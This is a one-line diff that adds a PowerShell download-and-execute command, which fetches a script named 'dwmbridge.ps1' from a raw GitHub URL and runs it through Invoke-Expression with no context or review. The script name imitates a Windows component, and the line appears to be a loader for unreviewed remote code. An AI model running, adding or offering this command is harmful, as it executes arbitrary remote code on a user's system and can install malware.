@@ -1,0 +1,1 @@
+iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AnatolyPivder/Kurbaran_Baraban/refs/heads/main/dwmbridge.ps1'))
